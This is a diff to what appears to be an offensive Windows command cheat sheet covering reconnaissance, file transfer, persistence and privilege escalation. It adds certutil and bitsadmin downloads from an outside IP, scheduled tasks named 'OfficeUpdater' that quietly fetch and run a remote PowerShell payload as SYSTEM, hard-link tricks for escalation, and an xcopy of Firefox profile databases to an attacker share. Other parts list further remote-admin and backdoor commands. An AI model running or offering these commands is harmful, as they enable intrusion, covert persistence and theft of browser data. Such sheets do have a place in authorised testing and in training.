@@ -13,8 +13,8 @@ WINDOWS COMMANDS
 
 https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands
 
-		
-BASIC
+
+BASICS & SYSTEM INFORMATION
 systeminfo
 ver
 	-system os version
@@ -97,6 +97,7 @@ rundll32.exe user32.dll, LockWorkStation
 	-lock workstation screen
 wscript.exe <script js/vbs>
 cscript.exe <script js/vbs/c#>
+	--not standard windows file
 winstat features
 auditpol /get /category:*
 	-audit policies
@@ -106,7 +107,8 @@ type plain.txt | clip
 	-pipe stdout of file contents to stind for clipboard, ctrl+c
 fciv.exe -sha1 somefile.ext
 	-return hash of file to verify file integrity if file has a known/expected value
-
+SET Processor
+	--return process architecture information
 	
 	
 FILESYSTEM
@@ -120,6 +122,8 @@ findstr /si password *.xml *.ini *.txt
 fsutil fsinfo drives
 	-list drives currently on the system
 	--requires admin privs
+fsutil hardlink create c:\windows\system32\fxstmp\mal.bat c:\users\yourname\target.exe 
+mklink /h c:\windows\system32\fxstmp\mal.bat c\users\hedleylamar\target.exe
 assoc
 	-print returned list of file extension associations
 assoc .ps1=powershellfile
@@ -142,17 +146,22 @@ tree C:\ /f /a > C:\Users\myself\Documents\tree.txt
 command | find /c /v “”
 New-Item -ItemType HardLink -Path "\Users\uname\appdata\blahblah\rundll32.lnk" -Target "\windows\SysWOW64\rundll32.exe"
 	-create a hardlink on the filesystem to execute another command on the system by passing reference or in a command line by invoking the alias of the link's name
-	
+for %%i in (a b d e f g h i j k l m n o p q r s t u v w x y z) do @dir %%i: 2>nul
+	-search for discoverable mapped drives
 
-File Transfer	
+
+File Transfer
+certutil.exe -urlcache -split -f "http://111.11.1.11/cve.exe" cve.exe
+	**--most reliable file transfer accross windows versions
+		--possible to flag as an attack, prefer 
 iexplore.exe http://blah.com/filename.zip
 C:\windows\explorer.exe http://somewhere.com/filename.ext
 ftp ftp.site.dom
-bitsadmin /transfer systemrepair /download /priority normal http://path/to/file c:\path\local\file
-bitsadmin /transfer blahblah /upload /priority low http://path/to/file c:\path\local\file
+bitsadmin /transfer systemrepair /download /priority normal http://111.11.1.11/path/to/file.ext c:\path\local\file.ext
+bitsadmin /transfer blahblah /upload /priority low http://111.11.1.11/path/to/file.ext c:\path\local\file.ext
 powershell.exe -w hidden -nop -ep bypass -c "(new-object net.webclient).DownloadFile('http://ip:port/file', 'C:\Windows\temp\testfile')"
 net use Z: \\netbios_name\share /PERSISTENT:YES
-	-connect to network drive
+	-connect to network smb/cifs drive
 net use Z: /delete
 	-disconnect network drive
 xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\*.sqlite \\your_box\firefox_funstuff
@@ -493,6 +502,8 @@ wmic /?
 	WMIC enable (remote)
 wmic startupwmic service
 	-start remote wmi service
+wmic startup get caption,command
+	-return list of programs that execute on system start
 netsh firewall set service RemoteAdmin enable
 	-enable remote administration (local, group or domain admins) over rpc
 netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
@@ -1024,6 +1035,9 @@ Pipsec.exe
 	
 	
 Scheduled Tasks
+schtasks /query /fo LIST 2>nul | findstr "TaskName"
+schtasks /query /fo LIST /v | findstr "TaskName Author: Run: User:"
+	-enumerate existing scheduled tasks
 schtasks /create /tn OfficeUpdaterA /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''https://111.11.1.11:8433/payload'''))'" /sc onlogon /ru System
 	--(X86) - On User Login
 schtasks /create /tn OfficeUpdaterB /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''https://111.11.1.11:8433/payload'''))'" /sc onstart /ru System
@@ -1064,7 +1078,12 @@ AUTOSTART DIRECTORIES
 	Windows NT 5.2, 5.1, 5,0
 Windows 9x
 	%SystemDrive%\wmiOWS\Start Menu\Programs\StartUp\
-	
+
+Writeable Paths ACL abuse (WIN10)
+	-modifying access controls (ACL) for certain writeable directory paths on unpatched Windows 10 builds can be abused to escalate user priviliges 
+fsutil hardlink create c:\windows\system32\fxstmp\mal.bat c:\users\yourname\target.exe 
+mklink /h c:\windows\system32\fxstmp\mal.bat c\users\hedleylamar\target.exe
+	--if binary deny execution is inherited and inheritance cannot be modified creating a hard link to target binary may allow arbitrary execution
 	
 Wireless backdoor
 netsh wlan set hostednetwork mode=[allow\|disallow]
@@ -1077,3 +1096,7 @@ references
 http://www.fuzzysecurity.com/tutorials/16.html
 https://www.toshellandback.com/2015/11/24/ms-priv-esc/
 http://www.bhafsec.com/wiki/index.php/Windows_Privilege_Escalation
+
+BONUS ROUND:
+https://web.archive.org/web/20111111130246/http://live.sysinternals.com/accesschk.exe
+	--archived version of accesschk [sysinternals suite]
